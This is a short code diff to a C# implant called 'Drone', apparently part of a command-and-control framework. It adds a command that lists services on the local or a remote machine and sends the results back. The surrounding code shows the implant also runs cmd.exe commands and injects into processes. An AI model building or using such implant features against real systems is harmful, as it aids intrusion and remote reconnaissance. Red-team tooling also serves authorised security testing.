@@ -57,6 +57,10 @@ namespace Drone
             }),
             new("ps", "List running processes", GetProcessListing),
             new("getuid", "Get current identity", GetCurrentIdentity),
+            new("services", "List services on the current or target machine", ListServices, new List<Command.Argument>
+            {
+                new("computerName")
+            }),
             new("shell", "Run a command via cmd.exe", ExecuteShellCommand, new List<Command.Argument>
             {
                 new("args", false)
@@ -278,6 +282,15 @@ namespace Drone
             }
             
             Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
+        }
+
+        private void ListServices(DroneTask task, CancellationToken token)
+        {
+            var computerName = string.Empty;
+            if (task.Arguments.Length > 0) computerName = task.Arguments[0];
+
+            var result = Host.GetServiceListing(computerName);
+            Drone.SendResult(task.TaskGuid, result.ToString());
         }
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
